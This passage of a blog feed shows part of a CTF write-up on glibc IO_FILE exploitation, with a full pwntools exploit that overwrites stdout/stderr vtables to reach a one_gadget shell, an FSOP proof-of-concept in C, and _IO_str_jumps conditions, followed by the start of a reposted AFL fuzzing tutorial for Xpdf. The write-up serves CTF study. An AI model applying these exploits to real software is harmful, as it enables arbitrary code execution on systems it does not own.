class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">"debug"</span>,arch = <span class="hljs-string">"amd64"</span>)<br>filename=<span class="hljs-string">'./the_end.the_end'</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process([<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'</span>, filename], env={<span class="hljs-string">"LD_PRELOAD"</span>:<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span>})<br>        <span class="hljs-comment"># p = process(filename)</span><br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">25550</span>)<br>    elf = ELF(filename)<br>    <span class="hljs-comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/hgfs/PWN/study_path/pwn_rm/pwn145_180/libc/64bit/libc-2.23.so")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/e/CTF/PWN/varctf/buuctf/exer/4/libc-2.27.so")</span><br>    libc = ELF(<span class="hljs-string">"/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sa      = <span class="hljs-keyword">lambda</span> x,data             :p.sendafter(x, data)<br>sla     = <span class="hljs-keyword">lambda</span> x,data             :p.sendlineafter(x, data)<br>r       = <span class="hljs-keyword">lambda</span> n                  :p.recv(n)<br>rl      = <span class="hljs-keyword">lambda</span> n                  :p.recvline(n)<br>ru      = <span class="hljs-keyword">lambda</span> x                  :p.recvuntil(x, drop=<span class="hljs-literal">True</span>)<br>r       = <span class="hljs-keyword">lambda</span> x                  :p.recv(x)<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(p.recvuntil(<span class="hljs-string">b'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = <span class="hljs-keyword">lambda</span> address,data       :log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">addr</span>):<br>    gdb.attach(sh,<span class="hljs-string">'b *0x{}\nc\n'</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">addr1,byte</span>):<br>    s(p64(addr1))<br>    s(p8(byte))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    ru(<span class="hljs-string">"here is a gift "</span>)<br>    sleep = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">", "</span>),<span class="hljs-number">16</span>)<br>    leak(<span class="hljs-string">"sleep"</span>,sleep)<br>    libc_addr = sleep - libc.sym[<span class="hljs-string">"sleep"</span>]<br>    lg(<span class="hljs-string">"libc_base"</span>,libc_addr)<br><br>    one_gadget = libc_addr + <span class="hljs-number">0xf1247</span><br>    stdout_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stdout_'</span>]+<span class="hljs-number">0xd8</span><br>    stderr_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stderr_'</span>]+<span class="hljs-number">0xd8</span><br>    lg(<span class="hljs-string">"one_gadget"</span>,one_gadget)<br>    lg(<span class="hljs-string">"stdout_vtable_ptr"</span>,stdout_vtable_ptr)<br>    lg(<span class="hljs-string">"stderr_vtable_ptr"</span>,stderr_vtable_ptr)<br><br>    fake_vtable_addr = stderr_vtable_ptr - <span class="hljs-number">0x58</span> <span class="hljs-comment"># fakeè™šè¡¨çš„ä½ç½®</span><br>    lg(<span class="hljs-string">"fake_vtable_addr"</span>,fake_vtable_addr)<br>    change(stdout_vtable_ptr,(fake_vtable_addr &amp; <span class="hljs-number">0xff</span>))<br>    change(stdout_vtable_ptr+<span class="hljs-number">1</span>,((fake_vtable_addr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)) <span class="hljs-comment">#åŠ«æŒstdoutç»“æ„ä½“çš„è™šè¡¨æŒ‡é’ˆæŒ‡å‘fake tableçš„ä½ç½®(_IO_2_1_stderr_+128)</span><br><br>    change(stderr_vtable_ptr,(one_gadget &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">1</span>,((one_gadget &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">2</span>,((one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>))<br><br>    sl(<span class="hljs-string">"exec /bin/sh 1&gt;&amp;0"</span>)<br><br>    p.interactive()<br><br><br><br>connect()<br>pwn()<br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><p>stdout_vtable_ptr -&gt; stderr_vtable_ptr - 0x58 (å®é™…ä¸Šæ˜¯stderr_vtable_ptrè™šè¡¨çš„ä½ç½®)</p><p>stderr_vtable_ptr -&gt;  one_gadget </p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>File Stream Oriented Programming é¢å‘æ–‡ä»¶æµç¼–ç¨‹</p><blockquote><p>FSOP çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ_IO_list_all çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„_IO_FILE é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚FSOP é€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°_IO_list_all é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª FILE è°ƒç”¨ fflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨_IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚</p></blockquote><p>è§¦å‘è¯¥å‡½æ•°éœ€è¦ç»•è¿‡</p><blockquote><p>if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</p></blockquote><ul><li>fp-&gt;_mode &lt;= 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><p>è€Œ_IO_flush_all_lockp ä¸éœ€è¦æ”»å‡»è€…æ‰‹åŠ¨è°ƒç”¨ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹è¿™ä¸ªå‡½æ•°ä¼šè¢«ç³»ç»Ÿè°ƒç”¨ï¼š</p><ol><li><p>å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶</p></li><li><p>å½“æ‰§è¡Œ exit å‡½æ•°æ—¶</p></li><li><p>å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶</p></li></ol><p>ctfwikiç»™çš„ç¤ºä¾‹å¾ˆç®€å•ï¼Œå…·ä½“åˆ©ç”¨æœ‰house of  orangeï¼Œåé¢å†è¯´ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>{<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br> <br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br> <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br> <br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br> <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>glibc 2.24 ä¸‹ IO_FILE çš„åˆ©ç”¨</p><blockquote><p>åœ¨ 2.24 ç‰ˆæœ¬çš„ glibc ä¸­ï¼Œå…¨æ–°åŠ å…¥äº†é’ˆå¯¹ IO_FILE_plus çš„ vtable åŠ«æŒçš„æ£€æµ‹æªæ–½ï¼Œglibc ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ vtable åœ°å€çš„åˆæ³•æ€§ã€‚é¦–å…ˆä¼šéªŒè¯ vtable æ˜¯å¦ä½äº_IO_vtable æ®µä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨_IO_vtable_check åšè¿›ä¸€æ­¥æ£€æŸ¥ã€‚</p></blockquote><h4 id="fileno-ä¸ç¼“å†²åŒºçš„ç›¸å…³åˆ©ç”¨"><a href="#fileno-ä¸ç¼“å†²åŒºçš„ç›¸å…³åˆ©ç”¨" class="headerlink" title="fileno ä¸ç¼“å†²åŒºçš„ç›¸å…³åˆ©ç”¨"></a>fileno ä¸ç¼“å†²åŒºçš„ç›¸å…³åˆ©ç”¨</h4><p>ç”±äº<a href="https://so.csdn.net/so/search?q=fwrite&amp;spm=1001.2101.3001.7020">fwrite</a>ç­‰å‡½æ•°ä¼šæœ€ç»ˆè°ƒç”¨ioå‡½æ•°ï¼Œå…¶ç¼“å†²åŒºçš„åˆåœ°å€æœ‰buf_baseå†³å®šï¼Œæ‰€ä»¥å¦‚æœä¿®æ”¹buf_baseä¸buf_endå°±å¯ä»¥å®ç°ä»»æ„åœ°å€è¾“å…¥ã€‚</p><h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -> overflow"></a>_IO_str_jumps -&gt; overflow</h4><p><code>libc</code>ä¸­ä¸ä»…ä»…åªæœ‰<code>_IO_file_jumps</code>è¿™ä¹ˆä¸€ä¸ª<code>vtable</code>ï¼Œè¿˜æœ‰ä¸€ä¸ªå«<code>_IO_str_jumps</code>çš„ ï¼Œè¿™ä¸ª <code>vtable</code> ä¸åœ¨ check èŒƒå›´ä¹‹å†…ã€‚å¦‚æœæˆ‘ä»¬èƒ½è®¾ç½®æ–‡ä»¶æŒ‡é’ˆçš„ <code>vtable</code> ä¸º <code>_IO_str_jumps</code> ä¹ˆå°±èƒ½è°ƒç”¨ä¸ä¸€æ ·çš„æ–‡ä»¶æ“ä½œå‡½æ•°ã€‚</p><p> æ„é€ æ¡ä»¶ï¼š</p><blockquote><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITESä¸ºå‡</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)ä¸ºå‡</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 ä¸èƒ½ä¸ºè´Ÿæ•°</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; åº”å½“æŒ‡å‘/bin/shå­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€</li><li>fp+0xe0æŒ‡å‘systemåœ°å€</li></ol></blockquote><h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -> finish"></a><strong>_IO_str_jumps -&gt; finish</strong></h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"> æ¡ä»¶ï¼š<br><br>_IO_buf_base ä¸ä¸ºç©º<br>_flags &amp; _IO_USER_BUF(<span class="hljs-number">0x01</span>) ä¸ºå‡<br>æ„é€ ï¼š<br><br>_flags = (binsh_in_libc + <span class="hljs-number">0x10</span>) &amp; ~<span class="hljs-number">1</span><br><br>_IO_buf_base = binsh_addr<br><br>_freeres_list = <span class="hljs-number">0x2</span><br><br>_freeres_buf = <span class="hljs-number">0x3</span><br><br>_mode = <span class="hljs-number">-1</span><br><br>vtable = _IO_str_finish - <span class="hljs-number">0x18</span><br><br>fp+<span class="hljs-number">0xe8</span> -&gt; system_addr<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ã€PWNã€‘IO-FILEçš„åˆ©ç”¨&quot;&gt;&lt;a href=&quot;#ã€PWNã€‘IO-FILEçš„åˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;ã€PWNã€‘IO_FILEçš„åˆ©ç”¨&quot;&gt;&lt;/a&gt;ã€PWNã€‘IO_FILEçš„åˆ©ç”¨&lt;/h1&gt;&lt;p&gt;æ­¤ç¯‡ç®€å•çš„å­¦ä¹ ä¸€ä¸‹IO_Fileçš„åˆ©</summary>
      
    
    
    
    <category term="IO_File" scheme="https://kylinxin.github.io/categories/IO-File/"/>
    
    
    <category term="IO_File" scheme="https://kylinxin.github.io/tags/IO-File/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing101ç³»åˆ— Exercise 1</title>
    <link href="https://kylinxin.github.io/2023/11/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/"/>
    <id>https://kylinxin.github.io/2023/11/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/</id>
    <published>2023-11-08T15:14:29.000Z</published>
    <updated>2023-11-24T11:10:09.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è½¬è½½-Fuzzing101ç³»åˆ—-Exercise-1-Xpdf"><a href="#è½¬è½½-Fuzzing101ç³»åˆ—-Exercise-1-Xpdf" class="headerlink" title="è½¬è½½ Fuzzing101ç³»åˆ— Exercise 1 - Xpdf "></a>è½¬è½½ <a href="https://www.cnblogs.com/hetianlab/p/16263090.html">Fuzzing101ç³»åˆ— Exercise 1 - Xpdf </a></h1><h2 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h2><p>ã€€Fuzzing101ç³»åˆ—åŒ…å«é’ˆå¯¹10 ä¸ªçœŸå®ç›®æ ‡çš„10ä¸ªç»ƒä¹ ï¼Œåœ¨ç»ƒä¹ ä¸­ä¸€æ­¥ä¸€æ­¥å­¦ä¹ FuzzingæŠ€æœ¯çš„çŸ¥è¯†ã€‚</p><p>ã€€æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzing/Fuzzï¼‰æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–è½¯ä»¶æµ‹è¯•æŠ€æœ¯ï¼Œå®ƒåŸºäºä¸ºç¨‹åºæä¾›éšæœºæˆ–å˜å¼‚çš„è¾“å…¥å€¼å¹¶ç›‘è§†å®ƒçš„å¼‚å¸¸å’Œå´©æºƒã€‚</p><p>ã€€AFLã€libFuzzer å’Œ HonggFuzz æ˜¯ç°å®ä¸–ç•Œåº”ç”¨ä¸­æœ€å¤šçš„ä¸‰ä¸ªæ¨¡ç³Šå™¨ï¼Œè¿™ä¸‰ä¸ªéƒ½æ˜¯è¦†ç›–å¼•å¯¼çš„è¿›åŒ–æ¨¡ç³Šå™¨ï¼ˆCoverage-guided evolutionary fuzzerï¼‰ã€‚å…¶ä¸­</p><ul><li>è¿›åŒ–ï¼ˆevolutionaryï¼‰æ˜¯ä¸€ç§å—è¿›åŒ–ç®—æ³•å¯å‘çš„å…ƒå¯å‘å¼æ–¹æ³•ï¼Œå®ƒåŸºæœ¬ä¸ŠåŒ…æ‹¬é€šè¿‡ä½¿ç”¨é€‰æ‹©æ ‡å‡†ï¼ˆä¾‹å¦‚è¦†ç›–ç‡ï¼‰éšæ—¶é—´æ¨ç§»åˆå§‹å­é›†ï¼ˆç§å­ï¼‰çš„è¿›åŒ–å’Œå˜å¼‚ã€‚</li><li>è¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰æ˜¯æŒ‡ä¸ºäº†å¢åŠ å‘ç°æ–°å´©æºƒçš„æœºä¼šï¼Œè¦†ç›–å¼•å¯¼çš„æ¨¡ç³Šå™¨æ”¶é›†å’Œæ¯”è¾ƒä¸åŒè¾“å…¥ä¹‹é—´çš„ä»£ç è¦†ç›–ç‡æ•°æ®ï¼Œå¹¶é€‰æ‹©é‚£äº›å¯¼è‡´æ–°æ‰§è¡Œè·¯å¾„çš„è¾“å…¥ã€‚</li></ul><p>ã€€åœ¨è¿™ä¸ªç»ƒä¹ ä¸­ï¼Œæˆ‘ä»¬å°†fuzz Xpdf PDF æŸ¥çœ‹å™¨ã€‚ç›®çš„æ˜¯åœ¨ XPDF 3.02 ä¸­æ‰¾åˆ° CVE-2019-13288 çš„å´©æºƒ/PoCã€‚</p><p>ã€€CVE-2019-13288 æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå¯èƒ½ä¼šé€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„æ–‡ä»¶å¯¼è‡´æ— é™é€’å½’ã€‚ç”±äºç¨‹åºä¸­æ¯ä¸ªè¢«è°ƒç”¨çš„å‡½æ•°éƒ½ä¼šåœ¨æ ˆä¸Šåˆ†é…ä¸€ä¸ªæ ˆå¸§ï¼Œå¦‚æœä¸€ä¸ªå‡½æ•°è¢«é€’å½’è°ƒç”¨è¿™ä¹ˆå¤šæ¬¡ï¼Œå°±ä¼šå¯¼è‡´æ ˆå†…å­˜è€—å°½å’Œç¨‹åºå´©æºƒã€‚å› æ­¤ï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œ DoS æ”»å‡»ã€‚å¯ä»¥åœ¨ä»¥ä¸‹é“¾æ¥ä¸­æ‰¾åˆ°æœ‰å…³ä¸å—æ§åˆ¶çš„é€’å½’æ¼æ´çš„æ›´å¤šä¿¡æ¯ï¼š<a href="https://cwe.mitre.org/data/definitions/674.html">https://cwe.mitre.org/data/definitions/674.html</a></p><h2 id="ä½ ä¼šå­¦åˆ°ä»€ä¹ˆ"><a href="#ä½ ä¼šå­¦åˆ°ä»€ä¹ˆ" class="headerlink" title="ä½ ä¼šå­¦åˆ°ä»€ä¹ˆ"></a>ä½ ä¼šå­¦åˆ°ä»€ä¹ˆ</h2><p>ã€€å®Œæˆæœ¬ç»ƒä¹ åï¼Œä½ å°†äº†è§£ä½¿ç”¨ AFL è¿›è¡Œ fuzz çš„åŸºç¡€ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ä½¿ç”¨æ£€æµ‹ç¼–è¯‘ç›®æ ‡åº”ç”¨ç¨‹åº</li><li>è¿è¡Œæ¨¡ç³Šå™¨ï¼ˆafl-fuzzï¼‰</li><li>ä½¿ç”¨è°ƒè¯•å™¨ (GDB) å¯¹å´©æºƒè¿›è¡Œåˆ†ç±»</li></ul><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ã€€æ‰€æœ‰ç»ƒä¹ éƒ½åœ¨ Ubuntu 20.04.2 LTS ä¸Šè¿›è¡Œäº†æµ‹è¯•ã€‚ æˆ‘å¼ºçƒˆå»ºè®®æ‚¨ä½¿ç”¨ç›¸åŒçš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä»¥é¿å…ä¸åŒçš„æ¨¡ç³Šæµ‹è¯•ç»“æœï¼Œå¹¶åœ¨è£¸æœºç¡¬ä»¶è€Œä¸æ˜¯è™šæ‹Ÿæœºä¸Šè¿è¡Œ AFLï¼Œä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚</p><p>ã€€å¦åˆ™ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ° <a href="https://drive.google.com/file/d/1_m1x-SHcm7Muov2mlmbbt8nkrMYp0Q3K/view?usp=sharing">Ubuntu 20.04.2 LTS</a> é•œåƒã€‚ç”¨æˆ·åä¸º <code>fuzz</code> / <code>fuzz</code>ã€‚</p><p>ã€€AFL ä½¿ç”¨éç¡®å®šæ€§æµ‹è¯•ç®—æ³•ï¼Œå› æ­¤ä¸¤ä¸ªæ¨¡ç³Šæµ‹è¯•ä¼šè¯æ°¸è¿œä¸ä¼šç›¸åŒã€‚æˆ‘å¼ºçƒˆå»ºè®®è®¾ç½®ä¸€ä¸ªå›ºå®šçš„ç§å­ï¼ˆ<code>-s 123</code>ï¼‰ï¼Œè¿™æ ·ä½ çš„æ¨¡ç³Šæµ‹è¯•ç»“æœå°†ä¸æœ¬æ–‡çš„ç»“æœç›¸ä¼¼ã€‚</p><h2 id="ä¸‹è½½å¹¶æ„å»ºç›®æ ‡"><a href="#ä¸‹è½½å¹¶æ„å»ºç›®æ ‡" class="headerlink" title="ä¸‹è½½å¹¶æ„å»ºç›®æ ‡"></a>ä¸‹è½½å¹¶æ„å»ºç›®æ ‡</h2><p>ã€€é¦–å…ˆä¸ºè¦è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„é¡¹ç›®åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br></code></pre></td></tr></tbody></table></figure><p>â€‹ä¸ºäº†å®Œå…¨å‡†å¤‡å¥½ç¯å¢ƒï¼Œéœ€è¦å®‰è£…ä¸€äº›é¢å¤–çš„å·¥å…·ï¼ˆmake å’Œ gccï¼‰</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> build-essential<br></code></pre></td></tr></tbody></table></figure><p>â€‹ä¸‹è½½ Xpdf 3.02ï¼š</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></td></tr></tbody></table></figure><p>â€‹æ„å»º Xpdfï¼š</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">"$HOME/fuzzing_xpdf/install/"</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></tbody></table></figure><p>â€‹ä¸‹é¢å¯¹ Xpdf è¿›è¡Œæµ‹è¯•ï¼Œé¦–å…ˆä¸‹è½½ä¸€äº› PDF ç¤ºä¾‹ï¼š</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 